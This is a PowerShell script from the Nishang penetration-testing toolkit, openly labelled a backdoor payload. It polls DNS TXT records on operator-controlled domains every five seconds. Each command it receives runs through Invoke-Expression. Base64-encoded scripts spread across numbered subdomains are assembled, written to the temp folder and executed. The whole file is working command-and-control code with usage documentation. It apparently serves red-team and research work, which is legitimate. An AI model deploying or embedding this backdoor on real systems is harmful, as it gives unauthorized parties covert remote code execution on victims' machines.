<#
.SYNOPSIS
Nishang Payload which acts as a backdoor and is capable of 
recieving commands and PowerShell scripts from DNS TXT queries.

.DESCRIPTION
This payload continuously queries a subdomain's TXT records. It could be
sent commands and powershell scripts to be executed on the target machine by
TXT messages of a domain.

.PARAMETER startdomain
The domain (or subdomain) whose TXT records would be checked regularly
for further instructions.

.PARAMETER cmdstring
 The string, if responded by TXT record of startdomain, will make the payload
 query "commanddomain" for commands.
 
.PARAMETER commanddomain
The domain (or subdomain) whose TXT records would be used to issue commands
to the payload.

.PARAMETER psstring
 The string, if responded by TXT record of startdomain, will make the payload
 query "psdomain" for powershell script. The script must contain a number at the last (e.g. script5)
 which signifies the number of lines in the powershell script.

.PARAMETER psdomain
The domain (or subdomain) which would be used to provide powershell scripts from 
its TXT records. This domain MUST contain subdomains for the number of lines of
your powershell script. If the script is 5 lines i.e. you use "script5" as TXT
record of startdomain, psdomain must contain 1.psdomain, 2.psdomain and so on upto 5.psdomain.
This way the query would be saved on the target and will be exeucted.

.EXAMPLE
PS > .\DNS_TXT_Pwnage.ps1 start.alteredsecurity.com begincommands command.alteredsecurity.com script5 alteredsecurity.com
In the above example if you want to execute commands. TXT record of start.alteredsecurity.com
must contain only "begincommands" and command.alteredsecurity.com should conatin a single command 
you want to execute. The TXT record could be changed live and the payload will pick up updated 
record to execute new command.

To execute a script in above example, start.alteredsecurity.com must contain string in "string<number>" format
like "script5". In this case, alteredsecurity.com must contain subdomains 1.alteredsecurity.com upto 5.alteredsecurity.com.
Note that the payload expects each line of the powershell script in TXT queries to be base64 encoded. 
Use the StringToBase64 script to encode scripts to base64.

.LINK
http://labofapenetrationtester.blogspot.com/
http://code.google.com/p/nishang
#>



Param ( [Parameter(Position = 0, Mandatory = $True)] [String] $startdomain,
[Parameter(Position = 1, Mandatory = $True)] [String]$cmdstring,
[Parameter(Position = 1, Mandatory = $True)] [String]$commanddomain,
[Parameter(Position = 1, Mandatory = $True)] [String]$psstring,
[Parameter(Position = 2, Mandatory = $True)] [String]$psdomain )
#start.alteredsecurity.com
function DNS_TXT_Pwnage
{
while(1)
{
start-sleep -seconds 5
$getcode = (Invoke-Expression "nslookup -querytype=txt $startdomain") 
$tmp = $getcode | select-string -pattern "`""
$startcode = $tmp -split("`"")[0]
if ($startcode[1] -eq $cmdstring)
{
start-sleep -seconds 5
$getcommand = (Invoke-Expression "nslookup -querytype=txt $commanddomain") 
$temp = $getcommand | select-string -pattern "`""
$command = $temp -split("`"")[0]
Invoke-Expression $command[1]
}
if ($startcode[1] -match $psstring)
{
$len = ($startcode[1].length) - 1
$i = $startcode[1].substring($len)
$readstring = @()
for ($j=1; $j -le $i; $j++)
{

$getps = (Invoke-Expression "nslookup -querytype=txt $j.$psdomain") 
$tempps = $getps | select-string -pattern "`""
$tempps1 = $tempps -split("`"")[0]
$psscript = $tempps1[1]
$readstring  = [System.Convert]::FromBase64String($psscript)
$decodedstring = $decodedstring + "`r`n" + [System.Text.Encoding]::UTF8.GetString($readstring)

}
Out-File -FilePath "$env:temp\dns_payload.ps1" -Force -InputObject "$decodedstring"
Invoke-Expression "$env:temp\dns_payload.ps1"
break
}
}
}

DNS_TXT_Pwnage